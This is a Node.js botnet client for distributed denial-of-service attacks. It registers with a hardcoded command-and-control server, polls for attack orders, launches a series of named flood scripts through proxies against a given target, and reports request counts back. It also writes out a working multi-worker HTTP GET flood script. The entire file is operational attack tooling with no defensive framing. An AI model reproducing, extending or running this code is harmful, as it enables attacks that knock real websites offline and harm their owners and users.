const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const os = require('os');
const crypto = require('crypto');

// ========== CONFIGURATION ==========
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com';
const MAX_REGISTRATION_ATTEMPTS = 5;
const HEARTBEAT_INTERVAL = 30000;
const COMMAND_POLL_INTERVAL = 3000;

// ========== GENERATE UNIQUE BOT ID ==========
function generateBotId() {
  const timestamp = Date.now().toString(36);
  const random = crypto.randomBytes(6).toString('hex');
  return `bot-${random}-${timestamp.slice(-4)}`;
}

// ========== BOT CONFIG ==========
const BOT_ID = generateBotId();
const BOT_NAME = `Bot-${Math.floor(Math.random() * 1000)}`;

// ========== COLORS ==========
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  gray: '\x1b[90m',
  redBright: '\x1b[91m',
  greenBright: '\x1b[92m',
  yellowBright: '\x1b[93m',
  blueBright: '\x1b[94m',
  magentaBright: '\x1b[95m',
  cyanBright: '\x1b[96m'
};

function color(text, colorCode) {
  return `${colorCode}${text}${colors.reset}`;
}

// ========== LOGGING ==========
function log(message, type = 'info') {
  const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const prefix = `[${timestamp}] [${BOT_ID.slice(0,8)}]`;
  switch(type) {
    case 'success': console.log(color(`${prefix} ✅ ${message}`, colors.green)); break;
    case 'error': console.log(color(`${prefix} ❌ ${message}`, colors.red)); break;
    case 'warning': console.log(color(`${prefix} ⚠️ ${message}`, colors.yellow)); break;
    case 'info': console.log(color(`${prefix} ℹ️ ${message}`, colors.cyan)); break;
    case 'attack': console.log(color(`${prefix} 🔥 ${message}`, colors.magentaBright)); break;
    case 'exec': console.log(color(`${prefix} ⚡ ${message}`, colors.blueBright)); break;
    default: console.log(`${prefix} ${message}`);
  }
}

// ========== GLOBALS ==========
let registrationAttempts = 0;
let activeProcesses = [];
let isBlocked = false;
let proxyList = [];
let uaList = [];
let requestCount = 0;
let totalRequests = 0;
let currentAttack = null;
let attackStartTime = null;
let isRunning = true;
let botReady = false;

// ========== INSTALL PACKAGES ==========
function checkAndInstallPackages() {
  const requiredPackages = ['axios', 'socks', 'random-useragent', 'https-proxy-agent', 'socks-proxy-agent', 'set-cookie-parser'];
  const missing = [];
  
  for (const pkg of requiredPackages) {
    try { 
      require.resolve(pkg); 
    } catch (e) { 
      missing.push(pkg); 
    }
  }
  
  if (missing.length === 0) {
    return Promise.resolve();
  }
  
  log(`Installing missing packages: ${missing.join(', ')}`, 'info');
  
  return new Promise((resolve, reject) => {
    const npmCmd = process.platform === 'win32' ? 'npm.cmd' : 'npm';
    const install = spawn(npmCmd, ['install', ...missing, '--no-save', '--silent'], {
      stdio: 'pipe',
      shell: true,
      cwd: __dirname
    });
    
    let stderr = '';
    install.stderr.on('data', (data) => {
      stderr += data.toString();
    });
    
    install.on('close', (code) => {
      if (code === 0) {
        log('Packages installed successfully', 'success');
        resolve();
      } else {
        log(`Install failed: ${stderr || 'Unknown error'}`, 'error');
        reject(new Error('Install failed'));
      }
    });
    
    install.on('error', (err) => {
      log(`Install error: ${err.message}`, 'error');
      reject(err);
    });
  });
}

// ========== FILE MANAGEMENT ==========
function ensureFiles() {
  const botDir = path.join(__dirname, 'bots', BOT_ID);
  if (!fs.existsSync(botDir)) fs.mkdirSync(botDir, { recursive: true });
  
  const proxyPath = path.join(botDir, 'proxy.txt');
  const uaPath = path.join(botDir, 'ua.txt');
  
  if (!fs.existsSync(proxyPath)) {
    fs.writeFileSync(proxyPath, '# Proxy list - one per line\n# Format: ip:port\n');
  }
  if (!fs.existsSync(uaPath)) {
    fs.writeFileSync(uaPath, '# User Agents - one per line\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n');
  }
  
  return { proxyPath, uaPath };
}

// ========== LOAD PROXIES/UA ==========
function loadProxies(proxyPath) {
  try {
    if (fs.existsSync(proxyPath)) {
      const data = fs.readFileSync(proxyPath, 'utf8');
      proxyList = data.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#') && l.includes(':'));
    }
  } catch (e) {}
}

function loadUserAgents(uaPath) {
  try {
    if (fs.existsSync(uaPath)) {
      const data = fs.readFileSync(uaPath, 'utf8');
      uaList = data.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    }
  } catch (e) {}
}

// ========== API CLIENT ==========
const httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
let api;

function getApi() {
  if (!api) {
    const axios = require('axios');
    api = axios.create({ timeout: 10000, httpsAgent, headers: { 'Content-Type': 'application/json' } });
  }
  return api;
}

// ========== REGISTER ==========
async function autoRegister() {
  if (isBlocked) { log('Bot blocked!', 'error'); process.exit(0); }
  if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
    log('Max attempts, retry in 60s', 'warning');
    setTimeout(() => { registrationAttempts = 0; autoRegister(); }, 60000);
    return;
  }
  try {
    const axios = getApi();
    const payload = { id: BOT_ID, name: BOT_NAME };
    const response = await axios.post(`${MASTER_SERVER}/register`, payload);
    if (response.data.approved) {
      log(`Registered! (${BOT_NAME})`, 'success');
      botReady = true;
      setInterval(() => checkForCommands(), COMMAND_POLL_INTERVAL);
      setInterval(() => sendHeartbeat(), HEARTBEAT_INTERVAL);
      return;
    }
  } catch (error) {
    if (error.response && error.response.status === 403) {
      log('Bot blocked!', 'error');
      isBlocked = true;
      process.exit(0);
    }
    registrationAttempts++;
    log(`Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, 'warning');
    setTimeout(() => autoRegister(), 5000);
  }
}

// ========== HEARTBEAT ==========
async function sendHeartbeat() {
  if (!botReady) return;
  try {
    const axios = getApi();
    await axios.get(`${MASTER_SERVER}/ping`);
    log(`Heartbeat | Reqs: ${totalRequests}`, 'info');
  } catch (error) {
    log('Heartbeat failed', 'error');
    registrationAttempts = 0;
    autoRegister();
  }
}

// ========== CHECK COMMANDS ==========
async function checkForCommands() {
  if (!botReady) return;
  try {
    const axios = getApi();
    const response = await axios.get(`${MASTER_SERVER}/get-command`, { params: { botId: BOT_ID } });
    if (response.data.hasCommand) {
      const command = response.data.command;
      if (command.action === 'stop') {
        log('STOP received', 'warning');
        stopAllAttacks();
      } else if (command.action === 'attack') {
        const { target, time, methods } = command;
        log(`Attack: ${methods} → ${target} for ${time}s`, 'attack');
        executeAttack(target, time, methods);
      }
    }
  } catch (error) {
    // Silent fail
  }
}

// ========== STOP ==========
function stopAllAttacks() {
  log(`Killing ${activeProcesses.length} processes`, 'warning');
  activeProcesses.forEach(proc => { 
    try { 
      proc.kill('SIGTERM'); 
    } catch (e) {} 
  });
  activeProcesses = [];
  currentAttack = null;
  requestCount = 0;
}

// ========== ATTACK ==========
function executeAttack(target, time, methods) {
  currentAttack = { id: Date.now(), target, methods, startTime: Date.now() };
  requestCount = 0;
  attackStartTime = Date.now();

  const execWithLog = (cmd, scriptName) => {
    log(`🚀 EXECUTING: ${scriptName}`, 'exec');
    log(`📝 Command: ${cmd}`, 'exec');
    
    const proc = exec(cmd, { 
      detached: true, 
      maxBuffer: 1024 * 1024,
      shell: true,
      cwd: __dirname
    }, (error, stdout, stderr) => {
      if (error && error.code !== 'SIGTERM') {
        log(`❌ ${scriptName} error: ${error.message}`, 'error');
        return;
      }
      if (stdout) {
        const lines = stdout.split('\n');
        lines.forEach(line => {
          if (line.trim()) {
            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
                line.includes('Sent') || line.includes('packet') || line.includes('connection') ||
                line.includes('RPS') || line.includes('rate')) {
              requestCount++;
              totalRequests++;
              log(`📊 ${scriptName} output: ${line.trim()}`, 'info');
            }
          }
        });
      }
      if (stderr && stderr.trim()) {
        log(`⚠️ ${scriptName} stderr: ${stderr.trim()}`, 'warning');
      }
    });
    
    // Capture stdout in real-time
    let stdoutBuffer = '';
    proc.stdout.on('data', (data) => {
      stdoutBuffer += data.toString();
      const lines = stdoutBuffer.split('\n');
      stdoutBuffer = lines.pop() || '';
      lines.forEach(line => {
        if (line.trim()) {
          if (line.includes('Request') || line.includes('GET') || line.includes('POST') || 
              line.includes('Sent') || line.includes('packet') || line.includes('connection') ||
              line.includes('RPS') || line.includes('rate')) {
            requestCount++;
            totalRequests++;
            log(`📊 ${scriptName} output: ${line.trim()}`, 'info');
          }
        }
      });
    });
    
    // Log when process starts
    proc.on('spawn', () => {
      log(`✅ ${scriptName} started (PID: ${proc.pid})`, 'success');
    });
    
    // Log when process exits
    proc.on('exit', (code, signal) => {
      if (code === 0) {
        log(`✅ ${scriptName} completed successfully`, 'success');
      } else if (code !== null) {
        log(`⚠️ ${scriptName} exited with code ${code}`, 'warning');
      }
    });
    
    activeProcesses.push(proc);
    
    // Auto-stop after time
    setTimeout(() => {
      const index = activeProcesses.indexOf(proc);
      if (index > -1) {
        try { 
          proc.kill('SIGTERM'); 
          log(`⏹️ ${scriptName} stopped after ${time}s`, 'warning');
        } catch (e) {}
        activeProcesses.splice(index, 1);
      }
    }, parseInt(time) * 1000 + 5000);
  };

  const botDir = path.join(__dirname, 'bots', BOT_ID);
  const proxyFile = path.join(botDir, 'proxy.txt');
  const uaFile = path.join(botDir, 'ua.txt');
  const methodsDir = path.join(__dirname, 'methods');
  
  log(`\n${'='.repeat(60)}`, 'info');
  log(`🔥 STARTING ATTACK: ${methods}`, 'attack');
  log(`🎯 Target: ${target}`, 'attack');
  log(`⏱️ Duration: ${time}s`, 'attack');
  log(`${'='.repeat(60)}`, 'info');
  
  switch(methods) {
    case 'RAPID10':
      log('📦 Launching RAPID10 attack suite (10 methods)', 'attack');
      execWithLog(`node ${path.join(methodsDir, 'r10-rapid.js')} ${target} ${time} 30 ${proxyFile} ${uaFile}`, 'r10-rapid.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-tcp.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-tcp.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-tls.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-tls.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-conn.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-conn.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-header.js')} ${target} ${time} 30 ${proxyFile} ${uaFile}`, 'r10-header.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-frag.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-frag.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-pipe.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-pipe.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-cookie.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-cookie.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-mixed.js')} ${target} ${time} ${proxyFile} ${uaFile}`, 'r10-mixed.js');
      execWithLog(`node ${path.join(methodsDir, 'r10-lowcpu.js')} ${target} ${time} 40 ${proxyFile} ${uaFile}`, 'r10-lowcpu.js');
      break;
      
    case 'RAW-GET':
      log('📦 Launching RAW-GET attack', 'attack');
      execWithLog(`node ${path.join(methodsDir, 'raw-get.js')} ${target} ${time} 15 9000`, 'raw-get.js');
      break;
      
    case 'CF-BYPASS':
      log('📦 Launching CF-BYPASS attack', 'attack');
      execWithLog(`node ${path.join(methodsDir, 'cf-bypass.js')} ${target} ${time} 4 32 ${proxyFile}`, 'cf-bypass.js');
      break;
      
    case 'MODERN-FLOOD':
      log('📦 Launching MODERN-FLOOD attack', 'attack');
      execWithLog(`node ${path.join(methodsDir, 'modern-flood.js')} ${target} ${time} 4 64 ${proxyFile}`, 'modern-flood.js');
      break;
      
    case 'HTTP-SICARIO':
      log('📦 Launching HTTP-SICARIO attack suite (4 methods)', 'attack');
      execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time} 32 6 ${proxyFile} --randrate --full --legit --query 1`, 'REX-COSTUM.js');
      execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time} 16 3 ${proxyFile}`, 'cibi.js');
      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 32 2 ${proxyFile}`, 'BYPASS.js');
      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 12 4 ${proxyFile}`, 'nust.js');
      break;
      
    case 'R9':
      log('📦 Launching R9 attack suite (5 methods)', 'attack');
      execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time} 32 7 ${proxyFile}`, 'high-dstat.js');
      execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3 ${proxyFile}`, 'w-flood1.js');
      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 16 2 ${proxyFile}`, 'vhold.js');
      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 16 2 ${proxyFile}`, 'nust.js');
      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 8 1 ${proxyFile}`, 'BYPASS.js');
      break;
      
    case 'R1':
      log('📦 Launching R1 attack suite (8 methods)', 'attack');
      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2 ${proxyFile}`, 'vhold.js');
      execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time} 64 2 ${proxyFile}`, 'high-dstat.js');
      execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time} 4 2 ${proxyFile}`, 'cibi.js');
      execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 16 2 ${proxyFile}`, 'BYPASS.js');
      execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time} 32 6 ${proxyFile} --randrate --full --legit --query 1`, 'REX-COSTUM.js');
      execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3 ${proxyFile}`, 'w-flood1.js');
      execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 16 2 ${proxyFile}`, 'vhold.js');
      execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time} 32 3 ${proxyFile}`, 'nust.js');
      break;
      
    default:
      log(`Unknown method: ${methods}`, 'error');
  }

  log(`${'='.repeat(60)}`, 'info');
  log(`⏳ Attack running for ${time}s...`, 'info');
  
  // Send report after attack completes
  setTimeout(() => { 
    if (requestCount > 0) {
      sendReport(target, methods, requestCount, time);
    }
    log(`📊 Attack complete - Total requests: ${requestCount}`, 'success');
  }, (parseInt(time) * 1000) + 2000);
}

// ========== REPORT ==========
async function sendReport(target, method, requestsMade, duration) {
  try {
    const axios = getApi();
    await axios.post(`${MASTER_SERVER}/api/report`, { 
      botId: BOT_ID, 
      target, 
      method, 
      requests: requestsMade, 
      duration 
    });
    log(`📤 Report sent: ${requestsMade} requests`, 'success');
  } catch (error) {
    log('Failed to send report', 'warning');
  }
}

// ========== SHUTDOWN ==========
function shutdown() {
  log('Shutting down...', 'warning');
  isRunning = false;
  stopAllAttacks();
  setTimeout(() => process.exit(0), 2000);
}

// ========== CREATE REQUIRED DIRECTORIES ==========
function setupDirectories() {
  const dirs = ['methods', 'bots'];
  for (const dir of dirs) {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  }
}

// ========== CREATE METHODS (if missing) ==========
function createMethodStubs() {
  const methodsDir = 'methods';
  const methodFiles = [
    'high-dstat.js', 'w-flood1.js', 'vhold.js', 'nust.js', 'BYPASS.js', 'cibi.js', 
    'REX-COSTUM.js', 'cf-bypass.js', 'modern-flood.js', 'raw-get.js',
    'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js', 
    'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'
  ];
  
  const stub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); 
const target = process.argv[2]; 
const time = parseInt(process.argv[3]) || 60; 
setTimeout(() => process.exit(0), time * 1000);`;
  
  for (const file of methodFiles) {
    const filePath = path.join(methodsDir, file);
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, stub(file.replace('.js', '')));
    }
  }
  
  const rawGetPath = path.join(methodsDir, 'raw-get.js');
  if (!fs.existsSync(rawGetPath)) {
    const rawGetContent = `const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    threads: parseInt(process.argv[4]) || 30,
    rate: parseInt(process.argv[5]) || 1000
};

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;
const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });

if (cluster.isMaster) {
    console.log(\`RAW-GET | \${args.target} | \${args.time}s | \${args.threads} workers\`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    let running = true;
    let requestCount = 0;
    const sendRequest = () => {
        if (!running) return;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?r=' + Math.random(),
            method: 'GET',
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { 
            requestCount++; 
            res.resume(); 
        });
        req.on('error', () => {});
        req.end();
        if (running) setImmediate(sendRequest);
    };
    for (let i = 0; i < 10; i++) sendRequest();
    setInterval(() => {
        console.log(\`📊 RPS: \${requestCount}/s\`);
        requestCount = 0;
    }, 1000);
    setTimeout(() => { running = false; process.exit(0); }, args.time * 1000);
}`;
    fs.writeFileSync(rawGetPath, rawGetContent);
  }
}

// ========== START ==========
async function startBot() {
  console.log(color('\n🤖 SINGLE BOT CONTROLLER', colors.cyanBright));
  console.log(color('='.repeat(50), colors.cyan));
  console.log(color(`📡 Master Server: ${MASTER_SERVER}`, colors.magenta));
  console.log(color(`🆔 Bot ID: ${BOT_ID}`, colors.magenta));
  console.log(color(`📛 Bot Name: ${BOT_NAME}`, colors.magenta));
  console.log(color('='.repeat(50), colors.cyan));
  console.log(color('\n⏳ Initializing bot...\n', colors.cyan));
  
  log(`Starting bot: ${BOT_NAME}`, 'info');
  
  // Setup directories and methods
  setupDirectories();
  createMethodStubs();
  
  // Check and install packages if needed
  try {
    await checkAndInstallPackages();
  } catch (error) {
    log(`Package installation failed: ${error.message}`, 'error');
    log('Continuing with available packages...', 'warning');
  }
  
  // Setup files and load data
  const { proxyPath, uaPath } = ensureFiles();
  loadProxies(proxyPath);
  loadUserAgents(uaPath);
  
  log(`Loaded ${proxyList.length} proxies and ${uaList.length} user agents`, 'info');
  
  // Setup signal handlers
  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);
  
  // Register with master server
  await autoRegister();
  log('Ready for commands', 'success');
  
  console.log(color('\n📊 Bot is running. Press Ctrl+C to stop.\n', colors.gray));
  
  // Keep alive
  setInterval(() => {}, 1000);
}

// ========== MAIN ==========
startBot().catch(error => {
  console.error(color(`Fatal error: ${error.message}`, colors.red));
  process.exit(1);
});
